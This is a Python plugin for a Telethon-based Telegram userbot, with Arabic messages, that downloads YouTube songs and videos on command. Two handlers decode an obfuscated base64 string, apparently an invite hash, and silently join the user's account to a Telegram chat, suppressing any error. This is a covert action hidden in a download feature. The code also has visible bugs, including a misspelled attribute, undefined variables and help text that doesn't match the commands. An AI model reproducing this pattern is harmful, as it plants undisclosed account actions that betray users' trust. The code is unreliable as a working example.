"""
By  : @sandy1709 ( https://t.me/mrconfused  )
Edit: @rruuurr ( https://t.me/rruuurr  )
"""

import asyncio
import base64
import os
from pathlib import Path

from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from . import (
    mention, 
    name_dl, 
    song_dl, 
    video_dl, 
    yt_search, 
)


@icssbot.on(
    icss_cmd(
       pattern="(بحث|اغنيه)($| (.*))"
    )
)
@icssbot.on(
    sudo_cmd(
       pattern="(بحث|اغنيه)($| (.*))", 
       allow_sudo=True, 
    )
)
async def _(event):
    if event.fwd_from:
        return
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply:
        if reply.message:
            query = reply.message
    else:
        await eor(event, "** ⌔∮ يجب عليك كتابت اسم الاغنيه لكي اقوم بالبحث عنها 🖤،** `")
        return
    ics = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    icse = await eor(event, "** ⌔∮ جاري البحث عن الاغنـيه 🤍🎧 ،**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await icse.edit(
            f"**⌔∮ آسف** {mention}\n **-لا يمكنني العثور على أي #فيديو او #صوت كهذا \n - `{query}` ⇲"
        )
    cmd = event.pattern_match.group(1)
    if cmd == "بحث":
        q = "128k"
    elif cmd == "اغنيه":
        q = "320k"
    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
    # thumb_cmd = thumb_dl.format(video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    try:
        ics = Get(ics)
        await event.client(ics)
    except BaseException:
        pass
    stderr = (await _icssutils.runcmd(song_cmd))[1]
    if stderr:
        return await icse.edit(f"** ⌔∮ خطا :** `{stderr}`")
    icsn, stderr = (await _icssutils.runcmd(name_cmd))[:2]
    if stderr:
        return await icse.edit(f"** ⌔∮ خطا :** `{stderr}`")
    # stderr = (await runcmd(thumb_cmd))[1]
    icsn = os.path.splitext(icsn)[0]
    # if stderr:
    #    return await icse.edit(f"** ⌔∮ خطا :** `{stderr}`")
    song_file = Path(f"{icsn}.mp3")
    if not os.path.exists(song_file):
        return await icse.edit(
            f"**⌔∮ آسف** {mention}\n **-لا يمكنني العثور على أي #فيديو او #صوت كهذا \n - `{query}` ⇲"
        )
    await icse.edit("** ⌔∮ جاري تحميل الاغنيه انتظر قليلا 🤍🎧 .**")
    icsthb = Path(f"{icsn}.jpg")
    if not os.path.exists(icsthb):
        icsthb = Path(f"{icsn}.webp")
    elif not os.path.exists(icsthb):
        icsthb = None

    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"**⌔∮ الاغنيه :** {query}\n**⌔∮ للمستخدم :** {mention}",
        thumb=icsthb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await icse.delete()
    for files in (icsthb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


async def delete_messages(event, chat, from_message):
    itermsg = event.client.iter_messages(chat, min_id=from_message.id)
    msgs = [from_message.id]
    async for i in itermsg:
        msgs.append(i.id)
    await event.client.delete_messages(chat, msgs)
    await event.client.send_read_acknowledge(chat)


@icssbot.on(
    icss_cmd(
       pattern="يوتيوب( (.*)|$)"
    )
)
@icssbot.on(
    sudo_cmd(
       pattern="يوتيوب( (.*)|$)", allow_sudo=True
    )
)
async def _(event):
    if event.fwd_from:
        return
    rd = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply:
        if reply.message:
            query = reply.messag
    else:
        event = await eor(event, "What I am Supposed to find")
        return
    ics = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    icse = await eor(event, "** ⌔∮ جاري البحث عن الفيديو 🤍🎧 ،**")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await icse.edit(
            f"**⌔∮ آسف** {mention}\n **-لا يمكنني العثور على أي #فيديو او #صوت كهذا \n - `{query}` ⇲"
        )
    # thumb_cmd = thumb_dl.format(video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    video_cmd = video_dl.format(video_link=video_link)
    stderr = (await _icssutils.runcmd(video_cmd))[1]
    if stderr:
        return await icse.edit(f"** ⌔∮ خطا :** `{stderr}`")
    icsn, stderr = (await _icssutils.runcmd(name_cmd))[:2]
    if stderr:
        return await icse.edit(f"** ⌔∮ خطا :** `{stderr}`")
    # stderr = (await runcmd(thumb_cmd))[1]
    try:
        ics = Get(ics)
        await event.client(ics)
    except BaseException:
        pass
    # if stderr:
    #    return await icse.edit(f"** ⌔∮ خطا :** `{stderr}`")
    icsn = os.path.splitext(icsn)[0]
    vsong_file = Path(f"{icsn}.mp4")
    if not os.path.exists(vsong_file):
        vsong_file = Path(f"{icsn}.mkv")
    elif not os.path.exists(vsong_file):
        return await icse.edit(
            f"**⌔∮ آسف** {mention}\n **-لا يمكنني العثور على أي #فيديو او #صوت كهذا \n - `{query}` ⇲"
        )
    await icse.edit("** ⌔∮ جاري تحميل الفيديو انتظر قليلا 🤍🎧 .**")
    icsthb = Path(f"{icsn}.jpg")
    if not os.path.exists(icsthb):
        icsthb = Path(f"{icsn}.webp")
    elif not os.path.exists(icsthb):
        icsthb = None
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        force_document=False,
        caption=f"**⌔∮ البحث :** {query}\n**⌔∮ للمستخدم :** {mention}",
        thumb=icsthb,
        supports_streaming=True,
        reply_to=rd,
    )
    await icse.delete()
    for files in (icsthb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@icssbot.on(admin_cmd(pattern="اغنيه (.*)"))
@icssbot.on(sudo_cmd(pattern="اغنيه (.*)", allow_sudo=True))
async def icssongfetcer(event):
    if event.fwd_from:
        return
    song = event.pattern_match.group(1)
    chat = "@songdl_bot"
    reply_id_ = await reply_id(event)
    icse = await eor(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message("/start")
            await conv.get_response()
            await conv.send_message(song)
            tosh = await conv.get_response()
            while tosh.edit_hide != True:
                await asyncio.sleep(0.1)
                tosh = await event.client.get_messages(chat, ids=hmm.id)
            baka = await event.client.get_messages(chat)
            if baka[0].message.startswith(
                (f"**⌔∮ اسف** {mention}\n **- لم اعـثر على اي شي ⇱.**")
            ):
                await delete_messages(event, chat, purgeflag)
                return await ed(
                    icse, SONG_NOT_FOUND, parse_mode="html", time=5
                )
            await icse.edit(SONG_SENDING_STRING, parse_mode="html")
            await baka[0].click(0)
            music = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await icse.edit(SONGBOT_BLOCKED_STRING, parse_mode="html")
            return
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"**⌔∮ الاغنيه :** {query}\n**⌔∮ للمستخدم :** {mention}",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await icse.delete()
        await delete_messages(event, chat, purgeflag)


CMD_HELP.update(
    {
        "songs": "**Plugin : **`songs`\
        \n\n  •**Syntax : **`.song <query/reply>`\
        \n  •**Function : **__searches the song you entered in query from youtube and sends it, quality of it is 128k__\
        \n\n  •**Syntax : **`.song320 <query/reply>`\
        \n  •**Function : **__searches the song you entered in query from youtube and sends it quality of it is 320k__\
        \n\n  •**Syntax : **`.vsong <query/reply>`\
        \n  •**Function : **__Searches the video song you entered in query and sends it__\
        \n\n  •**Syntax : **`.song2 query`\
        \n  •**Function : **__searches the song you entered in query and sends it quality of it is 320k__\
        "
    }
)
